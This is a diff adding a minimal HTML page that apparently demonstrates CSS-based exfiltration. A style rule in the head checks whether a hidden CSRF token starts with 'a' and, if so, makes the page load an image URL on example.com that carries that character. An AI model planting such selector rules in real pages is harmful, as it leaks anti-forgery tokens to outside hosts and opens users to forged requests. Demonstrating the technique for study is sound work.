@@ -1,0 +1,21 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Document</title>
+
+    <style>
+      input[name='csrf-token'][value^='a'] + input {
+        background: url('https://example.com?q=a');
+      }
+    </style>
+  </head>
+  <body>
+    <form action="/action">
+      <input type="hidden" name="csrf-token" value="abcde" />
+      <input name="username" />
+      <input type="submit" />
+    </form>
+  </body>
+</html>
